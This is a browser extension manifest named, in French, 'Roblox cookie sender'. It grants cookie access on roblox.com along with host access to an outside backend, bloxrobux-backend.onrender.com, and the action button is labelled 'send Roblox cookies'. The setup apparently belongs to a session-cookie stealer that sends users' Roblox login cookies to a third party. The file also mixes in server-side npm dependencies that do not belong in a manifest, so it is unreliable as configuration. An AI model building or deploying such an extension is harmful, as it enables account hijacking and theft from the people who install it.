{
  "manifest_version": 3,
  "name": "Envoyeur de cookies Roblox",
  "version": "1.0",
  "permissions": [
    "cookies",
    "notifications",
    "contextMenus"
  ],
  "host_permissions": [
    "https://*.roblox.com/*",
    "https://bloxrobux-backend.onrender.com/*"
  ],
  "background": {
    "service_worker": "background.js"
  },
  "action": {
    "default_title": "Envoyer les cookies Roblox"
  },
  "icons": {
    "48": "icon.png"
  },
  "dependencies": {
  "express": "^4.19.2",
  "cors": "^2.8.5",
  "firebase-admin": "^12.0.0"
  }
}
